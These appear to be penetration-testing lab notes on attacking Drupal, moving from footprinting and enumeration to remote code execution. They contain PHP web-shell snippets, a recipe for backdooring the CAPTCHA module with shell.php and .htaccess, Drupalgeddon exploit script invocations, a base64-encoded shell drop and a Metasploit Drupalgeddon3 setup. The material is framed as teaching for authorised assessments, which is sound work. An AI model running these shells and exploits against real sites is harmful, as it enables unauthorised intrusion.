# Discovery/Footprinting

```bash
$ curl -s http://drupal.inlanefreight.local | grep Drupal
```

Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid>.

# Enumeration
```bash
$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

$ droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal
## Leveraging the PHP Filter Module
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated.

From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.

We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a "drive-by" attacker potentially coming across our web shell.
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3. Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access.
```bash
$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```


From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves.
```bash
$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to Administration > Reports > Available updates.

From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.

Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the PHP Filter module and delete any pages that we created to gain remote code executio

## Uploading a Backdoored Module
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA. Scroll down and copy the link for the tar.gz archive.

Download the archive and extract its contents.
```bash
$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
$ tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell.

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```bash
$ mv shell.php .htaccess captcha
$ tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.

Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
```bash
$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Leveraging Known Vulnerabilities
Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed Drupalgeddon. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.

- CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.

- CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

### Drupalgeddon
As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```bash
$ python2.7 drupalgeddon.py 

#  supply the target URL and a username and password for our new admin account
$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.

### Drupalgeddon2
We can use this [PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability. 
```bash 
$ python3 drupalgeddon2.py 

# We can check quickly with cURL and see that the hello.txt file was indeed uploaded.
$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

$ echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon3
Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

Once we have the session cookie, we can set up the exploit module as follows.

```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 
```